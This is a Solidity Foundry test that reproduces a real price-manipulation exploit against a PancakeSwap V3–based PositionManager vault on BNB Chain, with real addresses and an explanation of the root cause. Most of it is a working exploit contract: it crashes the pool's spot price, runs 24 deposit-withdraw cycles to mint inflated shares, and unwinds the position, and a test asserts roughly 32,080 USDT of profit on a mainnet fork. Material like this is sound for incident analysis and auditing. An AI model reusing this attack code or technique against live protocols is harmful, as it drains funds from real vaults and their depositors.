// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// PositionManager (symbol "PM", name "PositionManager") - PancakeSwap V3 spot-price (slot0) share
// mispricing drained the vault's own PancakeSwap V3 USDT/BTCB liquidity position - BNB Chain.
// Attacker realized 32,080.604282 USDT profit in a single atomic transaction.
//
// Attack tx       : 0x8725c094ae697f4df653f372dd01b627815ed46dbff2d75a75c5c83a15163da3 (block 124829770)
// Attacker EOA    : 0xfc3fAcD67138966aB0c841E905B0C4BCA1AbE92F (receives the final 32,080.60 USDT)
// Attack contract : 0x97F119508FD5CC15E90b539B603895a5CfC56808 (the tx `to`; the alert labelled this the
//                   "attacker", but on-chain it is the attack contract driving the loop)
// Victim          : 0x7cedB2e5d7791c7D46c5C9d35EaC4775bc887F00 (PositionManager, verified source)
// Main pool       : 0x46Cf1cF8c69595804ba91dFdd8d6b960c9B0a7C4 (PancakeSwap V3 USDT/BTCB, fee 500,
//                   token0 = USDT, token1 = BTCB; this is both the LP pool and the slot0 oracle)
// Chainlink feed  : 0x264990fbd0A4796A3E3d8E37C4d5F87a3aCa5Ebf (BTC/USD, the sound leg)
// USDT            : 0x55d398326f99059fF775485246999027B3197955 (baseToken)
// BTCB            : 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c
// Flash source    : 0x238a358808379702088667322f80aC48bAd5e6c4 (PancakeSwap Infinity Vault, 0-fee flash;
//                   modelled below as dealt working capital, see note in testExploit)
//
// Root cause (confirmed against the verified PositionManager source, not just the alert):
//   deposit(uint256) is permissionless - external nonReentrant, no owner/manager/keeper gate (the only
//   gated functions are addLiquidity/removeLiquidity/updatePosition/changePoolData, all onlyRole). So is
//   withdraw(). When the vault is in position, deposit() values the vault's holdings to size the shares it
//   mints (PositionManager.sol:125-140):
//       poolPrice            = _processedPoolPrice()                  // slot0 sqrtPriceX96^2, RAW SPOT
//       token1Price          = _getChainlinkPrice() * PRECISION      // BTC/USD, sound
//       contractLiqInToken1  = amountToken0 * poolPrice / PRECISION + amountToken1   // USDT valued at SPOT
//       contractLiqInBaseTok = contractLiqInToken1 * token1Price / (PRECISION*CHAINLINK_PRECISION)
//       shares               = depositAmount * totalSupply / contractLiqInBaseTok
//   The Chainlink leg prices BTCB soundly, but the vault's existing USDT (amountToken0) is converted to
//   BTCB-terms using the manipulable PancakeSwap V3 spot price. Depress the USDT/BTCB spot right before
//   depositing and contractLiqInBaseToken (the denominator) is understated, so deposit() mints too many
//   shares. withdraw() then burns those shares and pays out token0/token1 pro-rata against the real pool
//   position (PositionManager.sol:187-200) with no delay, no TWAP and no deviation guard, so the inflated
//   shares redeem real value in the same transaction.
//
// Attack flow, reconstructed below as ordinary typed calls (no raw calldata replay) exactly as the trace shows:
//   1. Obtain 9,000,010 USDT working capital (on-chain: a 0-fee PancakeSwap Infinity Vault flash loan).
//   2. Swap 8,000,000 USDT -> 91.765609 BTCB in the V3 pool (zeroForOne) to crash sqrtPriceX96
//      from 274452124608361913298767630 to 261748504334048619437859565 -> USDT quotes far too cheap.
//   3. 24x: deposit(1,000,000 USDT) into the victim, which mints inflated PM shares against the crashed
//      spot price, then immediately withdraw(), redeeming those shares for more value than was deposited.
//   4. Swap the BTCB back to USDT (reverse the manipulation and realize the drained value as USDT).
//   5. Repay the 9,000,010 USDT flash; keep the surplus.
//
// The pool is the loser here (its net USDT balance falls 32,096.098596 across the tx); the fee receiver
// (ProtocolManager proxy 0xec90...) collects 15.494313 USDT of deposit fees along the way, and the attacker
// EOA nets 32,080.604282 USDT - exactly the amount transferred out at the end of the on-chain trace.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IPancakeV3Pool {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
    function slot0()
        external
        view
        returns (
            uint160 sqrtPriceX96,
            int24 tick,
            uint16 observationIndex,
            uint16 observationCardinality,
            uint16 observationCardinalityNext,
            uint32 feeProtocol,
            bool unlocked
        );
    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface IPositionManager {
    function deposit(uint256 depositAmount) external returns (uint256 shares);
    function withdraw() external;
}

contract PositionManagerExploit {
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant BTCB = IERC20(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c);
    IPancakeV3Pool constant POOL = IPancakeV3Pool(0x46Cf1cF8c69595804ba91dFdd8d6b960c9B0a7C4);
    IPositionManager constant VICTIM = IPositionManager(0x7cedB2e5d7791c7D46c5C9d35EaC4775bc887F00);

    // PancakeSwap V3 / TickMath sqrt price bounds, used as swap price limits.
    uint160 constant MIN_SQRT_RATIO = 4_295_128_739;
    uint160 constant MAX_SQRT_RATIO = 1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_342;

    uint256 constant MANIPULATION_USDT = 8_000_000 ether; // dumped to crash the USDT/BTCB spot price
    uint256 constant DEPOSIT_AMOUNT = 1_000_000 ether; // per cycle
    uint256 constant CYCLES = 24; // exactly as on-chain

    function attack() external {
        // Step 1: crash the pool's spot price. token0 = USDT, token1 = BTCB, so zeroForOne dumps USDT for
        // BTCB and pushes sqrtPriceX96 down -> the vault's USDT reads cheap when deposit() values it.
        POOL.swap(address(this), true, int256(MANIPULATION_USDT), MIN_SQRT_RATIO + 1, "");

        // Step 2: 24 permissionless deposit->withdraw cycles. Each deposit mints inflated shares against the
        // depressed spot price; each withdraw redeems them pro-rata against the real position for more value.
        USDT.approve(address(VICTIM), type(uint256).max);
        for (uint256 i = 0; i < CYCLES; i++) {
            VICTIM.deposit(DEPOSIT_AMOUNT);
            VICTIM.withdraw();
        }

        // Step 3: reverse the manipulation - sell all BTCB back to USDT, realizing the drained value.
        uint256 btcbBal = BTCB.balanceOf(address(this));
        if (btcbBal > 0) {
            POOL.swap(address(this), false, int256(btcbBal), MAX_SQRT_RATIO - 1, "");
        }
    }

    // V3 swap callback: pay whichever token the pool is owed (positive delta). token0 = USDT, token1 = BTCB.
    function pancakeV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata) external {
        require(msg.sender == address(POOL), "not pool");
        if (amount0Delta > 0) USDT.transfer(msg.sender, uint256(amount0Delta));
        if (amount1Delta > 0) BTCB.transfer(msg.sender, uint256(amount1Delta));
    }
}

contract PositionManager_exp is Test {
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant BTCB = IERC20(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c);
    address constant POOL = 0x46Cf1cF8c69595804ba91dFdd8d6b960c9B0a7C4;
    address constant VICTIM = 0x7cedB2e5d7791c7D46c5C9d35EaC4775bc887F00;

    // 0-fee PancakeSwap Infinity Vault flash loan taken on-chain; modelled here as dealt working capital.
    uint256 constant FLASH_CAPITAL = 9_000_010 ether;

    function setUp() public {
        // The default "bsc" foundry.toml endpoint is not archival at this height; pin an archive node so
        // the PoC is self-contained and needs no env vars.
        vm.createSelectFork("https://bsc-mainnet.public.blastapi.io", 124_829_769); // parent of the exploit block
    }

    function testExploit() public {
        emit log_named_decimal_uint("pool USDT reserve before", USDT.balanceOf(POOL), 18);
        emit log_named_decimal_uint("pool BTCB reserve before", BTCB.balanceOf(POOL), 18);

        PositionManagerExploit exploit = new PositionManagerExploit();

        // Provide the flash-loan working capital (repaid implicitly: profit is measured net of it below).
        deal(address(USDT), address(exploit), FLASH_CAPITAL);
        assertEq(BTCB.balanceOf(address(exploit)), 0, "attacker should start with no BTCB");

        exploit.attack();

        // All BTCB sold back to USDT inside attack(); nothing left over.
        assertEq(BTCB.balanceOf(address(exploit)), 0, "BTCB not fully unwound");

        uint256 finalUsdt = USDT.balanceOf(address(exploit));
        uint256 profit = finalUsdt - FLASH_CAPITAL; // net of repaying the 9,000,010 USDT flash

        emit log_named_decimal_uint("pool USDT reserve after ", USDT.balanceOf(POOL), 18);
        emit log_named_decimal_uint("attacker USDT profit    ", profit, 18);

        // Matches the 32,080.604282546162934055 USDT sent to the attacker EOA at the end of the on-chain trace.
        assertApproxEqRel(profit, 32_080_604282546162934055, 0.01e18, "profit off expected ~32.08K USDT");
    }
}
